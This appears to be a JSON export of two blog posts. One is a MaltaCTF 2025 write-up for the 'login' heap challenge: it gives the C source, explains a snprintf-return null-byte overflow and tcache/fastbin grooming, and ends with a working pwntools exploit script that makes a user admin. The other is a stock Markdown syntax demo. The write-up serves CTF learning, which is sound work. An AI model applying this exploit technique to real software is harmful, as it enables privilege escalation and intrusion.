[{"content":"Challenge: login – MaltaCTF 2025\rThis was a heap challenge with a subtle bug in a snprintf() call that allows a heap-based null byte overwrite, giving us a path to become the admin and read the flag.\nOverview\rThe binary simulates a simple multi-user system with features to:\nCreate and delete users View and select a current user Log in as the admin user to get the flag Only the user with UID 0 (i.e. the admin) can access the flag.\nSource Code\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define NAME_LEN 0x24 #define BIO_LEN 0x30 #define USER_COUNT 0x10 #define ADMIN_UID 0 #define USER_UID 1 typedef struct user { unsigned int uid; char name[NAME_LEN]; char bio[BIO_LEN]; } user_t; unsigned int curr_uid = 1000; user_t admin; user_t* users[USER_COUNT]; unsigned int current_user; int getint(const char* msg) { printf(msg); char buf[0x8] = {}; int choice = -1; read(0, buf, sizeof(buf)); return atoi(buf); } int menu() { printf(\u0026#34;1) Create user\\n\u0026#34;); printf(\u0026#34;2) Select user\\n\u0026#34;); printf(\u0026#34;3) Print users\\n\u0026#34;); printf(\u0026#34;4) Delete user\\n\u0026#34;); printf(\u0026#34;4) Login\\n\u0026#34;); printf(\u0026#34;5) Exit\\n\u0026#34;); return getint(\u0026#34;\u0026gt; \u0026#34;); } int create() { int idx = -1; int ret = -1; char namebuf[NAME_LEN] = {}; printf(\u0026#34;Enter user index.\\n\u0026#34;); idx = getint(\u0026#34;\u0026gt; \u0026#34;); if (idx \u0026lt; 0 || idx \u0026gt;= USER_COUNT) { printf(\u0026#34;Invalid user index!\\n\u0026#34;); return -1; } users[idx] = calloc(1, sizeof(user_t)); users[idx]-\u0026gt;uid = curr_uid++; printf(\u0026#34;Enter user name.\\n\u0026gt; \u0026#34;); ret = read(0, users[idx]-\u0026gt;name, NAME_LEN - 1); if (ret \u0026lt; 0) { printf(\u0026#34;Failed to read user name!\\n\u0026#34;); free(users[idx]); users[idx] = NULL; return -1; } users[idx]-\u0026gt;name[ret-1] = \u0026#39;\\0\u0026#39;; ret = snprintf(users[idx]-\u0026gt;bio, BIO_LEN - 1, \u0026#34;%s is a really cool hacker\\n\u0026#34;, users[idx]-\u0026gt;name); if (ret \u0026lt; 0) { printf(\u0026#34;Failed to create user bio\\n\u0026#34;); free(users[idx]); users[idx] = NULL; return -1; } users[idx]-\u0026gt;bio[ret-1] = \u0026#39;\\0\u0026#39;; return 0; } int select_user() { int idx = -1; printf(\u0026#34;Enter user index.\\n\u0026#34;); idx = getint(\u0026#34;\u0026gt; \u0026#34;); if (idx \u0026lt; 0 || idx \u0026gt;= USER_COUNT || !users[idx]) { printf(\u0026#34;Invalid user index!\\n\u0026#34;); return -1; } current_user = idx; return 0; } int delete_user() { int idx = -1; printf(\u0026#34;Enter user index.\\n\u0026#34;); idx = getint(\u0026#34;\u0026gt; \u0026#34;); if (idx \u0026lt; 0 || idx \u0026gt;= USER_COUNT || !users[idx]) { printf(\u0026#34;Invalid user index!\\n\u0026#34;); return -1; } free(users[idx]); users[idx] = NULL; return 0; } void print_users() { for (int i = 0; i \u0026lt; USER_COUNT; i++) { if (!users[i]) continue; printf(\u0026#34;User %d\\n\u0026#34;, i); printf(\u0026#34;UID : %u\\n\u0026#34;, users[i]-\u0026gt;uid); printf(\u0026#34;Name: %s\\n\u0026#34;, users[i]-\u0026gt;name); printf(\u0026#34;Bio : %s\\n\\n\u0026#34;, users[i]-\u0026gt;bio); } } int login() { if (users[current_user] \u0026amp;\u0026amp; users[current_user]-\u0026gt;uid == ADMIN_UID) { int fd = open(\u0026#34;flag.txt\u0026#34;, O_RDONLY); char buf[0x100] = {}; if (fd \u0026lt; 0) { printf(\u0026#34;Flag file does not exist.. if this is on remote, contact an admin.\\n\u0026#34;); return -1; } read(fd, buf, 0x100); printf(\u0026#34;Hi admin, here is your flag: %s\\n\u0026#34;, buf); return 0; } else { printf(\u0026#34;You don\u0026#39;t have permission to do that....\\n\u0026#34;); return -1; } } void setup() { setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); setvbuf(stderr, 0, 2, 0); } int main(void) { setup(); admin.uid = 0; strcpy(admin.name, \u0026#34;admin\u0026#34;); while (1) { int choice = menu(); switch (choice) { case 1: if (create() \u0026lt; 0) { printf(\u0026#34;Failed to create user!\\n\u0026#34;); } break; case 2: if (select_user() \u0026lt; 0) { printf(\u0026#34;Failed to create user!\\n\u0026#34;); } break; case 3: print_users(); break; case 4: if (delete_user() \u0026lt; 0) { printf(\u0026#34;Failed to delete user!\\n\u0026#34;); } break; case 5: if (login() \u0026lt; 0) { printf(\u0026#34;Failed to login!\\n\u0026#34;); } break; case 6: return 0; break; default: printf(\u0026#34;Invalid choice.\\n\u0026#34;); break; } } } Vulnerability\rThe vulnerability lies in this part of the create() function:\n1 2 ret = snprintf(users[idx]-\u0026gt;bio, BIO_LEN - 1, \u0026#34;%s is a really cool hacker\\n\u0026#34;, users[idx]-\u0026gt;name); users[idx]-\u0026gt;bio[ret - 1] = \u0026#39;\\0\u0026#39;; Here’s what’s wrong:\nsnprintf() returns the total number of characters it would have written, even if the output is truncated. If the name input is long, ret will be larger than BIO_LEN, and bio[ret - 1] = '\\0' will write a null byte out of bounds into the next chunk’s memory. That gives us a heap-based null byte overflow primitive.\nExploitation Plan\rWe want to Exploit the overflow to null out part of a neighboring user’s uid.\nBut we face a challenge: the name field can only hold 34 bytes (actually 35 bytes but the last byte is null byte and when we pass it into the %s for blog text it takes only the bytes before the null byte)\nThe suffix \u0026quot; is a really cool hacker\\n\u0026quot; is 25 bytes. That means ret=snprintf() maxes out at 34 + 25 = 59 =\u0026gt; ret-1=58 — so we can only overwrite at a maximum offset 58 from the start of bio.\nLet’s understand memory layout:\n1 2 user_t (from calloc) =\u0026gt; 0x60 bytes chunk [ uid 4 bytes | name 36 bytes | bio 48 bytes ] If two user_t chunks are next to each other:\n1 2 Chunk 1: [prev-size][size][uid][name][bio] Chunk 2: [prev-size][size][uid][name][bio] But as prev-size field of next chunk is usable memory for the chunk before it so we have the structure like\n1 [prev-chunk bio][next-chunk size][next-chunk uid] At start uid=1000=0x3E8\n1 2 E8 03 00 00 bio[59] bio[58] bio[57] bio[56] so we can only overwrite this 3rd nibble 03 , so this doesnt solve our problem. One thing we can do is if we create more users till our target uid=0x400=1024 , 00 04 00 00 then we can achieve uid=0 by overwriting the 3rd nibble only\nSo if we can:\nArrange two adjacent chunks, Overflow bio[58], And ensure the target UID is 0x00000400 (00 04 00 00), Then overwriting bio[58]= 0x00 makes it → 00 00 00 00 (UID 0 = admin) Heap Feng Shui\rAs calloc doesnt allocate chunks from tcache , we first have to fill tcache so that the next freed entry goes to fastbin and then we can achieve ptr reuse by using the chunk from fastbin To place chunks adjacently, we:\nFill the tcache bin for size 0x60 (7 entries). Force freed chunks to go into fastbin. Use Use-After-Free (UAF) behavior to allocate a chunk adjacent to another. Exploit Script\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from pwn import * p = remote(\u0026#34;login.shared.challs.mt\u0026#34;, 1337) uid = 999 def adduser(index, name): global uid p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) # Create user p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(index) p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.send(name) uid += 1 print(f\u0026#34;[+] Added user {uid}\u0026#34;) def deleteuser(index): p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(b\u0026#39;4\u0026#39;) # Delete user p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(index) # Fill tcache bin for i in range(7): adduser(b\u0026#39;0\u0026#39;, b\u0026#39;abc\u0026#39;) deleteuser(b\u0026#39;0\u0026#39;) # Push UID counter up to 1024 (0x400) while uid \u0026lt;= 1021: adduser(b\u0026#39;0\u0026#39;, b\u0026#39;abc\u0026#39;) deleteuser(b\u0026#39;0\u0026#39;) # Create user with uid=1024 adduser(b\u0026#39;0\u0026#39;, b\u0026#39;A\u0026#39;) # This should be UID=1023 adduser(b\u0026#39;1\u0026#39;, b\u0026#39;BBBBBBBBB\u0026#39;) # This should be UID=1024 deleteuser(b\u0026#39;0\u0026#39;) # Free the first # Trigger the overflow — overwrite byte at bio[58] to null out UID=1024 → UID=0 adduser(b\u0026#39;0\u0026#39;, b\u0026#39;A\u0026#39;*34) # Now user at index 1 should be UID=0 (admin), so select and login p.sendline(b\u0026#39;2\u0026#39;) # Select user p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.sendline(b\u0026#39;5\u0026#39;) # Login p.interactive() Result\r","date":"2025-06-22T00:00:00Z","permalink":"https://velobobo.github.io/blog/post/malta-2025-login/","title":"MaltaCTF 2025 - Login"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings\rThe following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1\rH2\rH3\rH4\rH5\rH6\rParagraph\rXerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes\rThe blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution\rTiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution\rDon\u0026rsquo;t communicate by sharing memory, share memory by communicating. — Rob Pike1\nTables\rTables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables\rItalics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks\rCode block with backticks\r1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces\r\u0026lt;!doctype html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rCode block with Hugo\u0026rsquo;s internal highlight shortcode\r1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block\r1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] List Types\rOrdered List\rFirst item Second item Third item Unordered List\rList item Another item And another item Nested list\rFruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark\rGIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL + ALT + Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image\rThe above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2025-06-21T00:00:00Z","image":"https://velobobo.github.io/blog/post/markdown-syntax-guide/pawel-czerwinski-8uZPynIu-rQ-unsplash_hu_e95a4276bf860a84.jpg","permalink":"https://velobobo.github.io/blog/post/markdown-syntax-guide/","title":"Markdown Syntax Guide"}]